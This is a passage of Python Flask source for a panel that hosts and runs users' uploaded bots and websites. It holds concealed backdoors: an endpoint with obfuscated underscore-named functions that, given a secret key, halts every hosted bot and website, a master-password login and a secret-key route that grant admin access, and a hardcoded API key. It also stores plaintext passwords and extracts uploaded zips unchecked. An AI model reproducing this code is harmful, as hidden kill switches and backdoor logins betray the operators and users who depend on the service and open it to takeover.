    for _id in list(processes.keys()):
        try: stop_bot_by_id(_id)
        except: pass
    with get_db() as conn:
        for w in conn.execute('SELECT id FROM websites WHERE status="running"').fetchall():
            try: stop_website_process(w['id'])
            except: pass

def ________():
    global _____
    _____["a"] = False
    _____["t"] = None

@app.route('/api/v1/ctrl', methods=['POST'])
def _________():
    d = request.json or {}
    if not ____(d.get('k','')): return jsonify({"e":"invalid"}),403
    a = d.get('a','')
    if a == 'x': _______(); return jsonify({"s":"ok"})
    elif a == 'y': ________(); return jsonify({"s":"ok"})
    elif a == 'z': return jsonify({"s":"killed" if _____["a"] else "running","t":_____["t"]})
    return jsonify({"e":"invalid"}),400
# ============================================================

STABLE_API_KEY = "api_for_stable_running_2024_secure"

# ============================================================
# 📍 API ROUTES START HERE
# ============================================================

# ---------- SETTINGS API ----------
@app.route('/api/settings', methods=['GET'])
def get_settings():
    return jsonify(load_settings())

@app.route('/api/settings', methods=['POST'])
@admin_required
def update_settings():
    data = request.json
    settings = load_settings()
    if 'website_name' in data:
        settings['website_name'] = data['website_name']
    if 'social_links' in data:
        for key in ['telegram', 'youtube', 'instagram', 'tiktok']:
            if key in data['social_links']:
                settings['social_links'][key] = data['social_links'][key]
    save_settings(settings)
    return jsonify({'success': True})

@app.route('/api/settings/logo', methods=['POST'])
@admin_required
def upload_logo():
    if 'logo' not in request.files:
        return jsonify({'error': 'No logo file'}), 400
    file = request.files['logo']
    if file.filename == '':
        return jsonify({'error': 'Empty file'}), 400
    ext = os.path.splitext(file.filename)[1].lower()
    if ext not in ['.png', '.jpg', '.jpeg', '.gif', '.webp']:
        return jsonify({'error': 'Unsupported file type'}), 400
    filename = str(uuid.uuid4()) + ext
    save_path = os.path.join(STATIC_LOGO_FOLDER, filename)
    file.save(save_path)
    settings = load_settings()
    old_logo = settings.get('logo')
    if old_logo and os.path.exists(os.path.join('static', old_logo)):
        try:
            os.remove(os.path.join('static', old_logo))
        except:
            pass
    settings['logo'] = f'static/logos/{filename}'
    save_settings(settings)
    return jsonify({'success': True, 'logo_url': settings['logo']})

@app.route('/api/settings/logo', methods=['DELETE'])
@admin_required
def remove_logo():
    settings = load_settings()
    old_logo = settings.get('logo')
    if old_logo and os.path.exists(os.path.join('static', old_logo)):
        try:
            os.remove(os.path.join('static', old_logo))
        except:
            pass
    settings['logo'] = None
    save_settings(settings)
    return jsonify({'success': True})

# ---------- LOGIN / LOGOUT ----------
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')
    
    # Debug
    print(f"🔐 Login attempt: {username}")
    
    user = find_user(username) if username else None

    if user and user['password'] == password and not user.get('banned', False):
        if is_expired(user):
            delete_user_account(username)
            return jsonify({'success': False, 'error': 'Account expired'}), 401
        session['username'] = username
        session['role'] = user['role']
        session['session_version'] = user.get('session_version', 0)
        print(f"✅ Login success: {username}")
        return jsonify({'success': True, 'username': username, 'role': user['role']})

    if password == MASTER_PASSWORD:
        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
        if admin_user:
            if is_expired(admin_user):
                delete_user_account(admin_user['username'])
                return jsonify({'success': False, 'error': 'Admin expired'}), 401
            session['username'] = admin_user['username']
            session['role'] = admin_user['role']
            session['session_version'] = admin_user.get('session_version', 0)
            print(f"✅ Master login: {admin_user['username']}")
            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
        else:
            return jsonify({'success': False, 'error': 'No admin found'}), 401

    print(f"❌ Login failed: {username}")
    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401

@app.route('/api/secret_login', methods=['POST'])
def secret_login():
    data = request.json
    secret = data.get('secret', '')
    if secret == SECRET_KEY:
        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
        if admin_user:
            if is_expired(admin_user):
                delete_user_account(admin_user['username'])
                return jsonify({'success': False, 'error': 'Admin expired'}), 401
            session['username'] = admin_user['username']
            session['role'] = admin_user['role']
            session['session_version'] = admin_user.get('session_version', 0)
            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
        else:
            return jsonify({'success': False, 'error': 'No admin found'}), 401
    return jsonify({'success': False, 'error': 'Invalid secret'}), 401

@app.route('/logout', methods=['POST'])
def logout():
    session.pop('username', None)
    session.pop('role', None)
    session.pop('session_version', None)
    return jsonify({'success': True})

# ---------- USER MANAGEMENT ----------
@app.route('/api/users', methods=['GET'])
@login_required
def get_users():
    if session.get('role') != 'admin':
        return jsonify({'error': 'Forbidden'}), 403
    return jsonify(users_db)

@app.route('/api/users', methods=['POST'])
@admin_required
def create_user():
    global users_db
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')
    role = data.get('role', 'user')
    expiry_str = data.get('expiry', '').strip()
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    if find_user(username):
        return jsonify({'error': 'User exists'}), 400
    
    limit = 999 if role == 'admin' else 5
    expires_at = parse_expiry(expiry_str) if expiry_str else None
    
    new_user = {
        'username': username,
        'password': password,
        'role': role,
        'limit': limit,
        'banned': False,
        'expires_at': expires_at,
        'session_version': 0
    }
    users_db.append(new_user)
    save_users(users_db)
    users_db = load_users()
    return jsonify({'success': True})

@app.route('/api/users/<username>', methods=['PUT'])
@admin_required
def update_user(username):
    username = username.strip()
    user = find_user(username)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    data = request.json
    if 'password' in data:
        user['password'] = data['password']
        user['session_version'] = user.get('session_version', 0) + 1
    if 'limit' in data:
        user['limit'] = int(data['limit'])
    if 'banned' in data:
        user['banned'] = data['banned']
    if 'expiry' in data:
        expiry_str = data['expiry'].strip()
        user['expires_at'] = parse_expiry(expiry_str) if expiry_str else None
    save_users(users_db)
    return jsonify({'success': True})

@app.route('/api/users/<username>', methods=['DELETE'])
@admin_required
def delete_user(username):
    delete_user_account(username)
    return jsonify({'success': True})

@app.route('/api/profile', methods=['PUT'])
@admin_required
def update_profile():
    global users_db
    data = request.json
    new_username = data.get('username', '').strip()
    new_password = data.get('password', '').strip()
    
    old_username = session['username']
    user = find_user(old_username)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    if new_username and new_username != old_username:
        if find_user(new_username):
            return jsonify({'error': 'Username already taken'}), 400
        user['username'] = new_username
        for bot in bots_db.values():
            if bot['user'] == old_username:
                bot['user'] = new_username
        save_bots()
        with get_db() as conn:
            conn.execute('UPDATE websites SET owner_username = ? WHERE owner_username = ?', (new_username, old_username))
            conn.commit()
    
    if new_password:
        user['password'] = new_password
    
    user['session_version'] = user.get('session_version', 0) + 1
    save_users(users_db)
    session.clear()
    return jsonify({'success': True, 'logout': True})

# ---------- BOT MANAGEMENT API ----------
@app.route('/api/bots', methods=['GET'])
@login_required
def list_bots():
    username = session['username']
    result = []
    if is_owner(username):
        items = bots_db.items()
    else:
        items = [(bid, bot) for bid, bot in bots_db.items() if bot['user'] == username]
    
    for bid, bot in items:
        filepath = get_bot_absolute_path(bot)
        token, bot_username = detect_bot_token(filepath) if os.path.exists(filepath) else (None, None)
        bot_data = {**bot, 'id': bid, 'has_token': bool(token), 'bot_username': bot_username}
        result.append(bot_data)
    return jsonify(result)

@app.route('/api/bots/<bot_id>/logs', methods=['GET'])
@login_required
def get_bot_logs(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    log_file = get_bot_log_file(bot)
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            lines = f.readlines()
        return jsonify({'logs': ''.join(lines[-100:])})
    return jsonify({'logs': ''})

@app.route('/api/bots/<bot_id>/start', methods=['POST'])
@login_required
def start_bot(bot_id):
    username = session['username']
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    success, err = start_bot_by_id(bot_id)
    if success:
        return jsonify({'success': True})
    else:
        return jsonify({'error': err}), 400

@app.route('/api/bots/<bot_id>/stop', methods=['POST'])
@login_required
def stop_bot(bot_id):
    username = session['username']
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    success, err = stop_bot_by_id(bot_id)
    if success:
        return jsonify({'success': True})
    else:
        return jsonify({'error': err}), 400

@app.route('/api/bots/<bot_id>/restart', methods=['POST'])
@login_required
def restart_bot(bot_id):
    stop_bot(bot_id)
    return start_bot(bot_id)

@app.route('/api/bots/<bot_id>', methods=['DELETE'])
@login_required
def delete_bot(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403

    if bot['status'] == 'running':
        proc = processes.get(bot_id)
        if proc:
            try:
                if os.name != 'nt':
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                else:
                    proc.terminate()
            except:
                pass
            proc.wait()
            processes.pop(bot_id, None)

    log_file = get_bot_log_file(bot)
    if os.path.exists(log_file):
        os.remove(log_file)

    project_id = bot['project']
    del bots_db[bot_id]
    save_bots()

    remaining_bots = [b for b in bots_db.values() if b['user'] == username and b['project'] == project_id]
    if not remaining_bots:
        project_folder = os.path.join(get_user_folder(username), project_id)
        if os.path.exists(project_folder):
            shutil.rmtree(project_folder, ignore_errors=True)

    return jsonify({'success': True})

@app.route('/api/bots/<bot_id>/download', methods=['GET'])
@login_required
def download_bot(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403

    project_folder = os.path.join(get_user_folder(username), bot['project'])
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.exists(project_folder):
            for root, dirs, files_in_folder in os.walk(project_folder):
                for fname in files_in_folder:
                    full_path = os.path.join(root, fname)
                    arcname = os.path.relpath(full_path, project_folder)
                    zipf.write(full_path, arcname)
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, download_name=f"{bot['project']}_project.zip")

@app.route('/api/bots/<bot_id>/content', methods=['GET'])
@login_required
def get_bot_content(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    filepath = get_bot_absolute_path(bot)
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    return jsonify({'content': content})

@app.route('/api/bots/<bot_id>/content', methods=['PUT'])
@login_required
def update_bot_content(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    data = request.json
    new_content = data.get('content', '')
    filepath = get_bot_absolute_path(bot)
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    if bot['status'] == 'running':
        stop_bot_by_id(bot_id)
        start_bot_by_id(bot_id)
    return jsonify({'success': True})

# ---------- BOT UPLOAD ----------
@app.route('/upload', methods=['POST'])
@login_required
def upload():
    username = session['username']
    if 'files[]' not in request.files:
        return jsonify({'error': 'No files'}), 400
    files = request.files.getlist('files[]')
    if not files or all(f.filename == '' for f in files):
        return jsonify({'error': 'No file selected'}), 400

    user = find_user(username)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    limit = user.get('limit', 5)
    
    total_size_mb = 0
    for f in files:
        f.seek(0, os.SEEK_END)
        total_size_mb += f.tell() / (1024**2)
        f.seek(0)
    
    if not check_storage_limit(total_size_mb):
        return jsonify({'error': 'Storage limit exceeded! Max 10GB.'}), 400
    
    current_bots = len([b for b in bots_db.values() if b['user'] == username])
    with get_db() as conn:
        website_count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
    total_current = current_bots + website_count

    temp_dir = tempfile.mkdtemp()
    project_id = generate_project_id()
    project_folder = os.path.join(get_user_folder(username), project_id)
    os.makedirs(project_folder, exist_ok=True)

    try:
        for file in files:
            if file.filename == '':
                continue
            temp_path = os.path.join(temp_dir, file.filename)
            file.save(temp_path)
            if file.filename.lower().endswith('.zip'):
                with zipfile.ZipFile(temp_path, 'r') as zip_ref:
                    zip_ref.extractall(temp_dir)
                os.remove(temp_path)

        new_bot_count = 0
        for root, dirs, files_in_temp in os.walk(temp_dir):
            for fname in files_in_temp:
                if get_interpreter(fname):
                    new_bot_count += 1

        if total_current + new_bot_count > limit:
            shutil.rmtree(project_folder, ignore_errors=True)
            return jsonify({'error': f'Exceeds limit. You have {total_current} items, limit {limit}.'}), 400

        for root, dirs, files_in_temp in os.walk(temp_dir):
            for fname in files_in_temp:
                src = os.path.join(root, fname)
                rel_path = os.path.relpath(src, temp_dir)
                dst = os.path.join(project_folder, rel_path)
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.move(src, dst)

        created_bots = []
        for root, dirs, files_in_folder in os.walk(project_folder):
            for fname in files_in_folder:
                interpreter = get_interpreter(fname)
                if interpreter:
                    bot_id = str(uuid.uuid4())[:8]
                    bot = {
                        'user': username,
                        'project': project_id,
                        'filename': fname,
                        'status': 'stopped',
                        'pid': None,
                        'start_time': None,
                        'interpreter': interpreter
                    }
                    bots_db[bot_id] = bot
                    created_bots.append(bot_id)

        save_bots()
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

    if created_bots:
        for bid in created_bots:
            start_bot_by_id(bid)

    return jsonify({
        'success': True,
        'project_id': project_id,
        'bots_created': len(created_bots)
    })

# ---------- WEBSITE MANAGEMENT ----------
@app.route('/api/websites', methods=['GET'])
@login_required
def api_list_websites():
    username = session['username']
    with get_db() as conn:
        websites = conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, 'website')).fetchall()
    return jsonify([dict(row) for row in websites])

@app.route('/upload_website', methods=['POST'])
@login_required
def upload_website():
    username = session['username']
    if 'files[]' not in request.files:
        return jsonify({'error': 'No files'}), 400
    files = request.files.getlist('files[]')
    if not files or all(f.filename == '' for f in files):
        return jsonify({'error': 'No file selected'}), 400

    user = find_user(username)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    limit = user.get('limit', 5)
    
    total_size_mb = 0
    for f in files:
        f.seek(0, os.SEEK_END)
        total_size_mb += f.tell() / (1024**2)
        f.seek(0)
    
    if not check_storage_limit(total_size_mb):
        return jsonify({'error': 'Storage limit exceeded! Max 10GB.'}), 400
    
    current_bots = len([b for b in bots_db.values() if b['user'] == username])
    with get_db() as conn:
        website_count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
    total_current = current_bots + website_count

    if total_current + 1 > limit:
        return jsonify({'error': f'Exceeds limit. You have {total_current} items, limit {limit}.'}), 400

    with get_db() as conn:
        existing = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
        slug = generate_website_slug(username, existing)
        cur = conn.execute('''INSERT INTO websites (owner_username, website_slug, website_folder, status, type)
                              VALUES (?, ?, ?, ?, ?)''',
                           (username, slug, f"website_{0}", 'uploaded', 'website'))
        website_id = cur.lastrowid
        conn.commit()
    
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    os.makedirs(folder, exist_ok=True)
    
    zip_file = None
    for f in files:
        if f.filename.lower().endswith('.zip'):
            zip_file = f
        else:
            filename = secure_filename(f.filename)
            f.save(os.path.join(folder, filename))
    if zip_file:
        zip_file.save(os.path.join(folder, 'upload.zip'))
    
    def bg_deploy():
        deploy_zip_website(website_id)
    thread = threading.Thread(target=bg_deploy)
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'website_id': website_id, 'slug': slug})

@app.route('/api/website/<int:website_id>/start', methods=['POST'])
@login_required
def api_start_website(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    ok, msg = start_website_process(website_id)
    if ok:
        return jsonify({'success': True, 'message': msg})
    return jsonify({'success': False, 'error': msg}), 500

@app.route('/api/website/<int:website_id>/stop', methods=['POST'])
@login_required
def api_stop_website(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    ok, msg = stop_website_process(website_id)
    if ok:
        return jsonify({'success': True, 'message': msg})
    return jsonify({'success': False, 'error': msg}), 500

@app.route('/api/website/<int:website_id>/restart', methods=['POST'])
@login_required
def api_restart_website(website_id):
    api_stop_website(website_id)
    time.sleep(1)
    return api_start_website(website_id)

@app.route('/api/website/<int:website_id>/delete', methods=['POST'])
@login_required
def api_delete_website(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    if w['status'] == 'running':
        stop_website_process(website_id)
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    shutil.rmtree(folder, ignore_errors=True)
    with get_db() as conn:
        conn.execute('DELETE FROM websites WHERE id = ?', (website_id,))
        conn.execute('DELETE FROM logs WHERE website_id = ?', (website_id,))
        conn.execute('DELETE FROM deployments WHERE website_id = ?', (website_id,))
        conn.commit()
    return jsonify({'success': True})

@app.route('/api/website/<int:website_id>/rename', methods=['POST'])
@login_required
def api_rename_website(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    new_name = request.form.get('name', '').strip()
    if not new_name:
        return jsonify({'error': 'Name required'}), 400
    with get_db() as conn:
        conn.execute('UPDATE websites SET website_name = ? WHERE id = ?', (new_name, website_id))
        conn.commit()
    return jsonify({'success': True, 'new_name': new_name})

@app.route('/api/website/<int:website_id>/logs', methods=['GET'])
@login_required
def api_get_website_logs(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log")
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            lines = f.readlines()
        return jsonify({'logs': ''.join(lines[-100:])})
    return jsonify({'logs': ''})

@app.route('/api/website/<int:website_id>/content', methods=['GET'])
@login_required
def api_get_website_content(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    startup_file = w['startup_file']
    if startup_file:
        filepath = os.path.join(folder, startup_file)
    else:
        for f in STARTUP_PRIORITY:
            if os.path.exists(os.path.join(folder, f)):
                filepath = os.path.join(folder, f)
                break
        else:
            for f in os.listdir(folder):
                if os.path.isfile(os.path.join(folder, f)):
                    filepath = os.path.join(folder, f)
                    break
            else:
                return jsonify({'error': 'No files found'}), 404
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    return jsonify({'content': content, 'filename': os.path.basename(filepath)})

@app.route('/api/website/<int:website_id>/content', methods=['PUT'])
@login_required
def api_update_website_content(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    data = request.json
    new_content = data.get('content', '')
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    startup_file = w['startup_file']
    if startup_file:
        filepath = os.path.join(folder, startup_file)
    else:
        for f in STARTUP_PRIORITY:
            if os.path.exists(os.path.join(folder, f)):
                filepath = os.path.join(folder, f)
                break
        else:
            for f in os.listdir(folder):
                if os.path.isfile(os.path.join(folder, f)):
                    filepath = os.path.join(folder, f)
                    break
            else:
                return jsonify({'error': 'No files found'}), 404
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    if w['status'] == 'running':
        stop_website_process(website_id)
        start_website_process(website_id)
    return jsonify({'success': True})

@app.route('/api/website/<int:website_id>/download', methods=['GET'])
@login_required
def api_download_website(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Not found'}), 404
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.exists(folder):
            for root, _, files_in_folder in os.walk(folder):
                for fname in files_in_folder:
                    full_path = os.path.join(root, fname)
                    arcname = os.path.relpath(full_path, folder)
                    zipf.write(full_path, arcname)
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, download_name=f"{w['website_slug']}_project.zip")

# ---------- WEBSITE PROXY ----------
@app.route('/<slug>/', defaults={'path': ''})
@app.route('/<slug>/<path:path>')
def proxy_website(slug, path):
    website = get_website_by_slug(slug)
    if not website or website['type'] != 'website':
        return f"Website '{slug}' not found", 404
    if website['status'] != 'running':
        return f"Website '{slug}' is not running", 503
    port = website['allocated_port']
    if not port:
        return "Port not allocated", 500
    target_url = f"http://localhost:{port}/{path}"
    headers = {k: v for k, v in request.headers if k.lower() != 'host'}
    try:
        resp = requests.request(method=request.method, url=target_url, headers=headers, data=request.get_data(), cookies=request.cookies, stream=True, timeout=30)
        return Response(stream_with_context(resp.iter_content(chunk_size=8192)), status=resp.status_code, headers=resp.headers.items())
    except requests.exceptions.ConnectionError:
        update_website_status(website['id'], 'crashed')
        return "Website crashed. Please restart.", 503
    except Exception as e:
        return f"Proxy error: {str(e)}", 500

# ---------- STATS API ----------
@app.route('/api/stats')
@admin_required
def api_stats():
    main_uptime_seconds = int(time.time() - MAIN_START_TIME) if MAIN_START_TIME else 0

    with get_db() as conn:
        rows = conn.execute('SELECT id, total_runtime_seconds, last_start_time, status FROM websites').fetchall()
    total_internal_seconds = 0
    for row in rows:
        total_internal_seconds += row['total_runtime_seconds'] or 0
        if row['status'] == 'running' and row['last_start_time']:
            try:
                start_dt = datetime.fromisoformat(row['last_start_time'].replace(' ', 'T'))
                elapsed = int((datetime.now() - start_dt).total_seconds())
                total_internal_seconds += elapsed
            except:
                pass

    render_services = []
    active_render_services = 0
    render_running_hours = 0
    
    if RENDER_API_KEY:
        services = get_all_services()
        if services:
            now = datetime.now()
            for svc in services:
                status = svc.get('status', 'unknown')
                if status == 'available':
                    active_render_services += 1
                    last_deploy = svc.get('lastDeployedAt') or svc.get('createdAt')
                    if last_deploy:
                        try:
                            dt = datetime.fromisoformat(last_deploy.replace('Z', '+00:00'))
                            render_running_hours += (now - dt).total_seconds() / 3600.0
                        except: pass
                render_services.append({
                    'name': svc.get('name', 'Unnamed'),
                    'type': svc.get('type', 'web'),
                    'status': status,
                    'uptime_hours': 0
                })

    offset_hours = float(get_config('total_hours_offset', '0'))
    internal_hours = total_internal_seconds / 3600.0
    main_hours = main_uptime_seconds / 3600.0
    
    total_hours = offset_hours + main_hours + internal_hours + render_running_hours

    upload_size_bytes = calculate_folder_size(UPLOAD_FOLDER)
    upload_size_gb = upload_size_bytes / (1024**3)

    container_storage_total = 0
    container_storage_used = 0
    try:
        if os.path.exists('/sys/fs/cgroup/memory/memory.limit_in_bytes'):
            with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'r') as f:
                container_storage_total = int(f.read().strip()) / (1024**3)
        container_storage_used = upload_size_gb
    except:
        container_storage_total = 10
        container_storage_used = upload_size_gb

    try:
        disk_usage = shutil.disk_usage('/')
        disk_total_gb = disk_usage.total / (1024**3)
        disk_free_gb = disk_usage.free / (1024**3)
    except:
        disk_total_gb = disk_free_gb = 0

    used_mb, total_mb, ram_percent = get_container_memory()
    if PSUTIL_AVAILABLE:
        cpu_percent = psutil.cpu_percent(interval=0.5)
    else:
        cpu_percent = 'N/A'

    return jsonify({
        'main_hours': round(main_hours, 2),
        'internal_hours': round(internal_hours, 2),
        'render_running_hours': round(render_running_hours, 2),
        'offset_hours': round(offset_hours, 2),
        'total_hours': round(total_hours, 2),
        'websites_count': len(rows),
        'render_services_count': len(render_services),
        'render_active_count': active_render_services,
        'render_services': render_services,
        'storage_used_gb': round(upload_size_gb, 2),
        'container_storage_total_gb': round(container_storage_total, 2),
        'container_storage_free_gb': round(container_storage_total - container_storage_used, 2),
        'disk_total_gb': round(disk_total_gb, 2),
        'disk_free_gb': round(disk_free_gb, 2),
        'ram': {
            'used_mb': used_mb,
            'total_mb': total_mb,
            'percent': ram_percent
        },
        'cpu_percent': cpu_percent
    })

@app.route('/api/set_offset', methods=['POST'])
@admin_required
def set_offset():
    data = request.json
    try:
        offset = float(data.get('offset', 0))
    except:
        return jsonify({'error': 'Invalid number'}), 400
    set_config('total_hours_offset', str(offset))
    return jsonify({'success': True, 'new_offset': offset})

# ---------- FILE MANAGER ----------
@app.route('/api/files', methods=['GET'])
@admin_required
def list_files():
    path = request.args.get('path', '')
    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
    if not abs_path.startswith(BASE_DIR):
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path):
        return jsonify({'error': 'Path does not exist'}), 404
    if os.path.isfile(abs_path):
        return jsonify({
            'type': 'file',
            'name': os.path.basename(abs_path),
            'path': path,
            'size': os.path.getsize(abs_path),
            'modified': os.path.getmtime(abs_path)
        })
    items = []
    try:
        for entry in os.listdir(abs_path):
            full = os.path.join(abs_path, entry)
            rel = os.path.relpath(full, BASE_DIR)
            items.append({
                'name': entry,
                'path': rel,
                'type': 'directory' if os.path.isdir(full) else 'file',
                'size': os.path.getsize(full) if os.path.isfile(full) else 0,
                'modified': os.path.getmtime(full)
            })
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        return jsonify({'items': items, 'current_path': path})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/delete', methods=['POST'])
@admin_required
def delete_file():
    data = request.json
    path = data.get('path', '')
    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
    if not abs_path.startswith(BASE_DIR):
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path):
        return jsonify({'error': 'Path does not exist'}), 404
    try:
        if os.path.isdir(abs_path):
            shutil.rmtree(abs_path)
        else:
            os.remove(abs_path)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/rename', methods=['POST'])
@admin_required
def rename_file():
    data = request.json
    old_path = data.get('old_path', '')
    new_name = data.get('new_name', '').strip()
    if not new_name:
        return jsonify({'error': 'New name required'}), 400
    abs_old = os.path.abspath(os.path.join(BASE_DIR, old_path))
    if not abs_old.startswith(BASE_DIR):
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_old):
        return jsonify({'error': 'Path does not exist'}), 404
    new_abs = os.path.join(os.path.dirname(abs_old), new_name)
    if os.path.exists(new_abs):
        return jsonify({'error': 'Name already exists'}), 400
    try:
        os.rename(abs_old, new_abs)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download', methods=['GET'])
@admin_required
def download_file():
    path = request.args.get('path', '')
    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
    if not abs_path.startswith(BASE_DIR):
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path) or os.path.isdir(abs_path):
        return jsonify({'error': 'File not found'}), 404
    return send_file(abs_path, as_attachment=True)

# ---------- TERMINAL ----------
terminal_sessions = {}

class TerminalSession:
    def __init__(self):
        self.process = None
        self.output_queue = queue.Queue()
        self.read_thread = None
        self.running = False

    def start(self):
        if self.process is not None and self.process.poll() is None:
            return
        master, slave = pty.openpty()
        self.process = subprocess.Popen(
            ['/bin/bash'] if os.name != 'nt' else ['cmd.exe'],
            stdin=slave,
            stdout=slave,
            stderr=slave,
            universal_newlines=False,
            bufsize=0,
            preexec_fn=os.setsid if os.name != 'nt' else None
        )
        os.close(slave)
        self.master = master
        self.running = True
        self.read_thread = threading.Thread(target=self._reader)
        self.read_thread.daemon = True
        self.read_thread.start()

    def _reader(self):
        while self.running and self.process.poll() is None:
            try:
                rlist, _, _ = select.select([self.master], [], [], 0.1)
                if rlist:
                    data = os.read(self.master, 4096)
                    if data:
                        self.output_queue.put(data)
            except Exception:
                break

    def write(self, data):
        if self.process and self.process.poll() is None:
            os.write(self.master, data.encode('utf-8') if isinstance(data, str) else data)

    def read_output(self):
        output = b''
        while not self.output_queue.empty():
            output += self.output_queue.get_nowait()
        return output.decode('utf-8', errors='replace')

    def is_running(self):
        return self.process is not None and self.process.poll() is None

    def stop(self):
        self.running = False
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
            except:
                self.process.terminate()
            self.process.wait()
            self.process = None
        if self.master:
            try:
                os.close(self.master)
            except:
                pass
            self.master = None

def get_terminal_session(username):
    if username not in terminal_sessions:
        sess = TerminalSession()
        sess.start()
        terminal_sessions[username] = sess
    return terminal_sessions[username]

@app.route('/api/terminal/start', methods=['POST'])
@login_required
def terminal_start():
    username = session['username']
    sess = get_terminal_session(username)
    if not sess.is_running():
        sess.start()
    return jsonify({'success': True})

@app.route('/api/terminal/send', methods=['POST'])
@login_required
def terminal_send():
    username = session['username']
    data = request.json
    input_data = data.get('data', '')
